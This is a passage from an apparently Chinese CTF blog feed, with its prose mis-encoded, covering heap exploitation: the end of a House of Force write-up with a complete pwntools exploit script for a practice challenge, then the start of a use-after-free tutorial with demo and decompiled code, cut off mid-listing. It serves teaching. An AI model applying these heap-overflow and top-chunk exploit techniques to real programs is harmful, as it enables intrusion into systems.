ï¼š16å­—èŠ‚</li></ul></li></ul><p>å¦ä¸€æ–¹é¢ï¼Œåœ¨æ»¡è¶³å¯¹åº”çš„çº¦æŸåï¼Œæˆ‘ä»¬éœ€è¦ä½¿å¾— <code>request2size</code>æ­£å¥½è½¬æ¢ä¸ºå¯¹åº”çš„å¤§å°ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œæˆ‘ä»¬éœ€è¦ä½¿å¾— ((req) + SIZE_SZ + MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK æ°å¥½ä¸º - 4112ã€‚é¦–å…ˆï¼Œå¾ˆæ˜¾ç„¶ï¼Œ-4112 æ˜¯ chunk å¯¹é½çš„ï¼Œé‚£ä¹ˆæˆ‘ä»¬åªéœ€è¦å°†å…¶åˆ†åˆ«å‡å» SIZE_SZï¼ŒMALLOC_ALIGN_MASK å°±å¯ä»¥å¾—åˆ°å¯¹åº”çš„éœ€è¦ç”³è¯·çš„å€¼ã€‚å…¶å®æˆ‘ä»¬è¿™é‡Œåªéœ€è¦å‡ SIZE_SZ å°±å¯ä»¥äº†ï¼Œå› ä¸ºå¤šå‡çš„ MALLOC_ALIGN_MASK æœ€åè¿˜ä¼šè¢«å¯¹é½æ‰ã€‚è€Œ<strong>å¦‚æœ -4112 ä¸æ˜¯ MALLOC_ALIGN çš„æ—¶å€™ï¼Œæˆ‘ä»¬å°±éœ€è¦å¤šå‡ä¸€äº›äº†ã€‚å½“ç„¶ï¼Œæˆ‘ä»¬æœ€å¥½ä½¿å¾—åˆ†é…ä¹‹åå¾—åˆ°çš„ chunk ä¹Ÿæ˜¯å¯¹é½çš„ï¼Œå› ä¸ºåœ¨é‡Šæ”¾ä¸€ä¸ª chunk çš„æ—¶å€™ï¼Œä¼šè¿›è¡Œå¯¹é½æ£€æŸ¥ã€‚</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">((req) + SIZE_SZ + MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK == <span class="hljs-number">-4112</span><br></code></pre></td></tr></table></figure><ul><li>å¯¹äºå¯¹é½æƒ…å†µ<ul><li>req &#x3D; - è·ç¦» - SIZE_SZ</li></ul></li><li>å¯¹äºæ²¡æœ‰å¯¹é½æƒ…å†µ<ul><li>req &#x3D; - è·ç¦» - SIZE_SZ - MALLOC_ALIGN_MASK</li></ul></li></ul><p>å› æ­¤ï¼Œæˆ‘ä»¬å½“è°ƒç”¨<code>malloc(-4120)</code>ä¹‹åï¼Œæˆ‘ä»¬å¯ä»¥è§‚å¯Ÿåˆ° top chunk è¢«æŠ¬é«˜åˆ°æˆ‘ä»¬æƒ³è¦çš„ä½ç½®</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">0x7ffff7dd1b20</span> &lt;main_arena&gt;:\   <span class="hljs-number">0</span>x0000000100000000  <span class="hljs-number">0</span>x0000000000000000<br><span class="hljs-attribute">0x7ffff7dd1b30</span> &lt;main_arena+<span class="hljs-number">16</span>&gt;: <span class="hljs-number">0</span>x0000000000000000  <span class="hljs-number">0</span>x0000000000000000<br><span class="hljs-attribute">0x7ffff7dd1b40</span> &lt;main_arena+<span class="hljs-number">32</span>&gt;: <span class="hljs-number">0</span>x0000000000000000  <span class="hljs-number">0</span>x0000000000000000<br><span class="hljs-attribute">0x7ffff7dd1b50</span> &lt;main_arena+<span class="hljs-number">48</span>&gt;: <span class="hljs-number">0</span>x0000000000000000  <span class="hljs-number">0</span>x0000000000000000<br><span class="hljs-attribute">0x7ffff7dd1b60</span> &lt;main_arena+<span class="hljs-number">64</span>&gt;: <span class="hljs-number">0</span>x0000000000000000  <span class="hljs-number">0</span>x0000000000000000<br><span class="hljs-attribute">0x7ffff7dd1b70</span> &lt;main_arena+<span class="hljs-number">80</span>&gt;: <span class="hljs-number">0</span>x0000000000000000  <span class="hljs-number">0</span>x0000000000601010 &lt;=== å¯ä»¥è§‚å¯Ÿåˆ°top chunkè¢«æŠ¬é«˜<br><span class="hljs-attribute">0x7ffff7dd1b80</span> &lt;main_arena+<span class="hljs-number">96</span>&gt;: <span class="hljs-number">0</span>x0000000000000000  <span class="hljs-number">0</span>x00007ffff7dd1b78<br></code></pre></td></tr></table></figure><p>ä¹‹åï¼Œæˆ‘ä»¬åˆ†é…çš„å—å°±ä¼šå‡ºç°åœ¨ 0x601010+0x10 çš„ä½ç½®ï¼Œä¹Ÿå°±æ˜¯ 0x601020 å¯ä»¥æ›´æ”¹ got è¡¨ä¸­çš„å†…å®¹äº†ã€‚</p><p>ä½†æ˜¯éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œåœ¨è¢«æŠ¬é«˜çš„åŒæ—¶ï¼Œmalloc@got é™„è¿‘çš„å†…å®¹ä¹Ÿä¼šè¢«ä¿®æ”¹ã€‚</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs lisp">set_head(<span class="hljs-name">victim</span>, nb | PREV_INUSE |<br>        (<span class="hljs-name">av</span> != <span class="hljs-symbol">&amp;main_arena</span> ? NON_MAIN_ARENA : <span class="hljs-number">0</span>))<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><h2 id="ä¾‹é¢˜"><a href="#ä¾‹é¢˜" class="headerlink" title="ä¾‹é¢˜"></a>ä¾‹é¢˜</h2><p>ä¾‹é¢˜ä¸‹è½½ ï¼š<a href="https://gitee.com/tky5216/CTF/raw/master/PWN/heap/pwn143_1604">ä¾‹é¢˜</a></p><p>éå¸¸ç»å…¸çš„èœå•</p><p><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202408011728057.png"></p><p>ç›´æ¥çœ‹å…³é”®ç‚¹</p><p><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202408011730321.png" alt="editå‡½æ•°"></p><p>editå‡½æ•°å­˜åœ¨å †æº¢å‡ºï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡è¿™ä¸ªæ¼æ´æ¥æ§åˆ¶Top chunkçš„sizeå­—æ®µ</p><p><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202408011733131.png"></p><p><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202408011735542.png" alt="mainå‡½æ•°"></p><p>è¾“å…¥5æ‰§è¡Œgondbye_meessageå‡½æ•°</p><p>åˆ©ç”¨æ€è·¯ï¼š</p><ol><li>é€šè¿‡houseofforceï¼Œå°†topchunkçš„åœ°å€ç§»åˆ°è®°å½•goodbye_messagedçš„chunk0å¤„ </li><li>å†æ¬¡ç”³è¯·chunkï¼Œæˆ‘ä»¬å°±èƒ½åˆ†é…åˆ°chunk0</li><li>å°†goodbye_messageæ”¹ä¸ºåâ»”å‡½æ•°çš„åœ°å€ </li><li>è¾“â¼Š5è°ƒâ½¤v4[1],å³å¯è·å¾—flag</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> re<br><br>filename = <span class="hljs-string">&#x27;./pwn143_1604&#x27;</span><br>url = <span class="hljs-string">&#x27;pwn.challenge.ctf.show 28117&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">extract_hostname_and_port</span>(<span class="hljs-params">url</span>):<br>    <span class="hljs-keyword">match</span> = re.<span class="hljs-keyword">match</span>(<span class="hljs-string">r&#x27;([^:\s]+)[\s:](\d*)&#x27;</span>, url)<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">match</span>:<br>        hostname = <span class="hljs-keyword">match</span>.group(<span class="hljs-number">1</span>)<br>        port = <span class="hljs-keyword">match</span>.group(<span class="hljs-number">2</span>) <span class="hljs-keyword">if</span> <span class="hljs-keyword">match</span>.group(<span class="hljs-number">2</span>) <span class="hljs-keyword">else</span> <span class="hljs-literal">None</span><br>        <span class="hljs-keyword">return</span> hostname, port<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span>, <span class="hljs-literal">None</span><br><br>hostname, port = extract_hostname_and_port(url)<br>debug_flag = <span class="hljs-literal">False</span><br><br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(sys.argv) &gt; <span class="hljs-number">1</span>:<br>    <span class="hljs-keyword">if</span> sys.argv[<span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;remote&#x27;</span>:<br>        p = remote(hostname, port)<br>    <span class="hljs-keyword">elif</span> sys.argv[<span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;debug&#x27;</span>:<br>        p = process(filename)<br>        debug_flag = <span class="hljs-literal">True</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Usage: python script.py [remote|debug]&quot;</span>)<br>        exit(<span class="hljs-number">1</span>)<br><span class="hljs-keyword">else</span>:<br>    p = process(filename)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>():<br>    <span class="hljs-keyword">if</span> debug_flag:<br>        <span class="hljs-keyword">try</span>:<br>            gdbscript = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">            b * 0x000000000400AEB</span><br><span class="hljs-string">            b * 0x000000000400C65</span><br><span class="hljs-string">            b * 0x000000000400D7D</span><br><span class="hljs-string">            &#x27;&#x27;&#x27;</span><br>            gdb.attach(p, gdbscript=gdbscript)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;GDB attached successfully&quot;</span>)<br>        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Failed to attach GDB: <span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.terminal = [<span class="hljs-string">&#x27;tmux&#x27;</span>, <span class="hljs-string">&#x27;splitw&#x27;</span>, <span class="hljs-string">&#x27;-h&#x27;</span>, <span class="hljs-string">&#x27;-p&#x27;</span>, <span class="hljs-string">&#x27;80&#x27;</span>]<br><br>elf = ELF(filename)<br>debug()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>() :<br>  p.sendafter(<span class="hljs-string">&#x27;Your choice:&#x27;</span> , <span class="hljs-string">b&#x27;1&#x27;</span>)<br>  <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size , content</span>) :<br>  p.sendafter(<span class="hljs-string">&#x27;Your choice:&#x27;</span> , <span class="hljs-string">b&#x27;2&#x27;</span>)<br>  p.sendafter(<span class="hljs-string">&#x27;Please enter the length:&#x27;</span> , <span class="hljs-built_in">str</span>(size))<br>  p.sendafter(<span class="hljs-string">&#x27;Please enter the name:&#x27;</span> , content)<br>  <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">idx , size , content</span>) :<br>  p.sendafter(<span class="hljs-string">&#x27;Your choice:&#x27;</span> , <span class="hljs-string">b&#x27;3&#x27;</span>)<br>  p.sendafter(<span class="hljs-string">&#x27;Please enter the index:&#x27;</span> , <span class="hljs-built_in">str</span>(idx))<br>  p.sendafter(<span class="hljs-string">&#x27;Please enter the length of name:&#x27;</span> , <span class="hljs-built_in">str</span>(size))<br>  p.sendafter(<span class="hljs-string">&#x27;Please enter the new name:&#x27;</span> , content)<br>  <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">idx</span>) :<br>  p.sendafter(<span class="hljs-string">&#x27;Your choice:&#x27;</span> , <span class="hljs-string">b&#x27;4&#x27;</span>)<br>  p.sendafter(<span class="hljs-string">&#x27;Please enter the index:&#x27;</span> , <span class="hljs-built_in">str</span>(idx))<br>  <br><br>flag = <span class="hljs-number">0x0000000000400D7F</span><br>add(<span class="hljs-number">0x30</span> , <span class="hljs-string">&#x27;aaaa&#x27;</span>)<br>payload = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x38</span> + p64(<span class="hljs-number">0xffffffffffffffff</span>)<br>edit(<span class="hljs-number">0</span> , <span class="hljs-number">0x41</span> , payload)<br>offset = -<span class="hljs-number">0x68</span><br>add(offset , <span class="hljs-string">&#x27;aaaa&#x27;</span>)<br>add(<span class="hljs-number">0x10</span> , p64(flag) * <span class="hljs-number">2</span>)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><p>æ¯ä¸€æ­¥å †çš„å˜æ¢</p><p><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202408011740856.png" alt="ä¿®æ”¹Top chunkçš„sizeå­—æ®µ"></p><p><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202408011741988.png" alt="æ”¹å˜Top chunkçš„åœ°å€"></p><p><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202408011741669.png" alt="æ§åˆ¶goodbye_messaged"></p>]]></content>
    
    
    <categories>
      
      <category>å †</category>
      
    </categories>
    
    
    <tags>
      
      <tag>House-of-Force</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>UAFæ¼æ´</title>
    <link href="/2024/08/01/UAF%E6%BC%8F%E6%B4%9E/"/>
    <url>/2024/08/01/UAF%E6%BC%8F%E6%B4%9E/</url>
    
    <content type="html"><![CDATA[<h2 id="ä»€ä¹ˆæ˜¯UAF"><a href="#ä»€ä¹ˆæ˜¯UAF" class="headerlink" title="ä»€ä¹ˆæ˜¯UAF"></a>ä»€ä¹ˆæ˜¯UAF</h2><p>UAFå°±æ˜¯Use After Freeï¼Œç®€å•æ¥è¯´å°±æ˜¯é‡Šæ”¾åå†æ¬¡è¢«ä½¿ç”¨ï¼Œåˆ†ä¸ºä¸€ä¸‹å‡ ç§æƒ…å†µï¼š</p><ul><li>å†…å­˜å—è¢«é‡Šæ”¾åï¼Œå…¶å¯¹åº”çš„æŒ‡é’ˆè¢«è®¾ç½®ä¸º NULL ï¼Œ ç„¶åå†æ¬¡ä½¿ç”¨ï¼Œè‡ªç„¶ç¨‹åºä¼šå´©æºƒã€‚</li><li>å†…å­˜å—è¢«é‡Šæ”¾åï¼Œå…¶å¯¹åº”çš„æŒ‡é’ˆæ²¡æœ‰è¢«è®¾ç½®ä¸º NULL ï¼Œç„¶ååœ¨å®ƒä¸‹ä¸€æ¬¡è¢«ä½¿ç”¨ä¹‹å‰ï¼Œæ²¡æœ‰ä»£ç å¯¹è¿™å—å†…å­˜å—è¿›è¡Œä¿®æ”¹ï¼Œé‚£ä¹ˆ<strong>ç¨‹åºå¾ˆæœ‰å¯èƒ½å¯ä»¥æ­£å¸¸è¿è½¬</strong>ã€‚</li><li>å†…å­˜å—è¢«é‡Šæ”¾åï¼Œå…¶å¯¹åº”çš„æŒ‡é’ˆæ²¡æœ‰è¢«è®¾ç½®ä¸º NULLï¼Œä½†æ˜¯åœ¨å®ƒä¸‹ä¸€æ¬¡ä½¿ç”¨ä¹‹å‰ï¼Œæœ‰ä»£ç å¯¹è¿™å—å†…å­˜è¿›è¡Œäº†ä¿®æ”¹ï¼Œé‚£ä¹ˆå½“ç¨‹åºå†æ¬¡ä½¿ç”¨è¿™å—å†…å­˜æ—¶ï¼Œ<strong>å°±å¾ˆæœ‰å¯èƒ½ä¼šå‡ºç°å¥‡æ€ªçš„é—®é¢˜</strong></li></ul><p>ç›®å‰æˆ‘åˆšå…¥é—¨åªç¢°è§ç¬¬ä¸€ç§ï¼Œçœ‹åˆ«äººçš„åšå®¢è¯´åä¸¤ç§æ¯”è¾ƒå¸¸è§ã€‚**æˆ‘ä»¬ä¸€èˆ¬ç§°é‡Šæ”¾åæ²¡æœ‰è¢«è®¾ç½®ä¸ºNULLçš„å†…å­˜æŒ‡é’ˆä¸ºdangling pointer(æ‚¬å‚æŒ‡é’ˆ)**ã€‚</p><p>è¿™é‡Œåœ¨how2heapä¸Šæœ‰ä¸ªå®éªŒ</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;This file doesn&#x27;t demonstrate an attack, but shows the nature of glibc&#x27;s allocator.\n&quot;</span>);<br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;glibc uses a first-fit algorithm to select a free chunk.\n&quot;</span>);<br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;If a chunk is free and large enough, malloc will select this chunk.\n&quot;</span>);<br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;This can be exploited in a use-after-free situation.\n&quot;</span>);<br><br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Allocating 2 buffers. They can be large, don&#x27;t have to be fastbin.\n&quot;</span>);<br><span class="hljs-type">char</span>* a = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x512</span>);<br><span class="hljs-type">char</span>* b = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x256</span>);<br><span class="hljs-type">char</span>* c;<br><br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;1st malloc(0x512): %p\n&quot;</span>, a);<br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;2nd malloc(0x256): %p\n&quot;</span>, b);<br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;we could continue mallocing here...\n&quot;</span>);<br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;now let&#x27;s put a string at a that we can read later \&quot;this is A!\&quot;\n&quot;</span>);<br><span class="hljs-built_in">strcpy</span>(a, <span class="hljs-string">&quot;this is A!&quot;</span>);<br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;first allocation %p points to %s\n&quot;</span>, a, a);<br><br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Freeing the first one...\n&quot;</span>);<br><span class="hljs-built_in">free</span>(a);<br><br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;We don&#x27;t need to free anything again. As long as we allocate smaller than 0x512, it will end up at %p\n&quot;</span>, a);<br><br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;So, let&#x27;s allocate 0x500 bytes\n&quot;</span>);<br>c = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x500</span>);<br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;3rd malloc(0x500): %p\n&quot;</span>, c);<br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;And put a different string here, \&quot;this is C!\&quot;\n&quot;</span>);<br><span class="hljs-built_in">strcpy</span>(c, <span class="hljs-string">&quot;this is C!&quot;</span>);<br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;3rd allocation %p points to %s\n&quot;</span>, c, c);<br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;first allocation %p points to %s\n&quot;</span>, a, a);<br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;If we reuse the first allocation, it now holds the data from the third allocation.\n&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>å¯ä»¥ç¼–è¯‘ä¸€ä¸‹åšä¸€ä¸‹è¿™ä¸ªå®éªŒ</p><h2 id="ä¾‹é¢˜"><a href="#ä¾‹é¢˜" class="headerlink" title="ä¾‹é¢˜"></a>ä¾‹é¢˜</h2><p>åšä¸€ä¸ªæœ€ç®€å•çš„UAFæ¼æ´çš„é¢˜ï¼Œåˆå­¦å †åšå‡ºæ¥å†ç®€å•çš„é¢˜éƒ½ä¼šå¾ˆæœ‰æˆå°±æ„ŸğŸ˜ƒã€‚</p><p>ä¸‹è½½åœ°å€:<a href="https://gitee.com/tky5216/CTF/raw/master/PWN/heap/pwn141_1804">ä¾‹é¢˜</a></p><p><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202408011605301.png"></p><p>ä¸€ä¸ªç»å…¸èœå•ï¼Œæ‰“å¼€å„ä¸ªåŠŸèƒ½çœ‹ä¸€ä¸‹</p><p>Add note</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> <span class="hljs-title function_">add_note</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">int</span> v0; <span class="hljs-comment">// esi</span><br>  <span class="hljs-type">int</span> i; <span class="hljs-comment">// [esp+Ch] [ebp-1Ch]</span><br>  <span class="hljs-type">int</span> size; <span class="hljs-comment">// [esp+10h] [ebp-18h]</span><br>  <span class="hljs-type">char</span> buf[<span class="hljs-number">8</span>]; <span class="hljs-comment">// [esp+14h] [ebp-14h] BYREF</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v5; <span class="hljs-comment">// [esp+1Ch] [ebp-Ch]</span><br><br>  v5 = __readgsdword(<span class="hljs-number">0x14</span>u);<br>  <span class="hljs-keyword">if</span> ( count &lt;= <span class="hljs-number">5</span> )<br>  &#123;<br>    <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt;= <span class="hljs-number">4</span>; ++i )<br>    &#123;<br>      <span class="hljs-keyword">if</span> ( !*((_DWORD *)&amp;notelist + i) )<br>      &#123;<br>        *((_DWORD *)&amp;notelist + i) = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">8u</span>);<br>        <span class="hljs-keyword">if</span> ( !*((_DWORD *)&amp;notelist + i) )<br>        &#123;<br>          <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Alloca Error&quot;</span>);<br>          <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>        &#125;<br>        **((_DWORD **)&amp;notelist + i) = print_note_content;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Note size :&quot;</span>);<br>        read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">8u</span>);<br>        size = atoi(buf);<br>        v0 = *((_DWORD *)&amp;notelist + i);<br>        *(_DWORD *)(v0 + <span class="hljs-number">4</span>) = <span class="hljs-built_in">malloc</span>(size);<br>        <span class="hljs-keyword">if</span> ( !*(_DWORD *)(*((_DWORD *)&amp;notelist + i) + <span class="hljs-number">4</span>) )<br>        &#123;<br>          <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Alloca Error&quot;</span>);<br>          <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>        &#125;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Content :&quot;</span>);<br>        read(<span class="hljs-number">0</span>, *(<span class="hljs-type">void</span> **)(*((_DWORD *)&amp;notelist + i) + <span class="hljs-number">4</span>), size);<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Success !&quot;</span>);<br>        ++count;<br>        <span class="hljs-keyword">return</span> __readgsdword(<span class="hljs-number">0x14</span>u) ^ v5;<br>      &#125;<br>    &#125;<br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Full!&quot;</span>);<br>  &#125;<br>  <span class="hljs-keyword">return</span> __readgsdword(<span class="hljs-number">0x14</span>u) ^ v5;<br>&#125;<br></code></pre></td></tr></table></figure><p>ç”³è¯·å †å—çš„æ—¶å€™å…ˆç”³è¯·ä¸€ä¸ª0x8å¤§å°çš„å †å—ç®¡ç†ï¼Œç¬¬ä¸€ä¸ªå­—å‚¨å­˜äº†printå‡½æ•°çš„åœ°å€ï¼Œç¬¬äºŒä¸ªå­—å‚¨å­˜å †çš„å†…å®¹åœ°å€ï¼Œè¿™ä¸ªå †å—çš„åœ°å€å­˜åœ¨notelistä¸­ã€‚ä¸‹é¢å°±ç”³è¯·äº†å‚¨å­˜å†…å®¹çš„å †ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202408011615307.png" alt="ç”³è¯·å †ç»“æ„"></p><p>Delete note</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> <span class="hljs-title function_">del_note</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">int</span> v1; <span class="hljs-comment">// 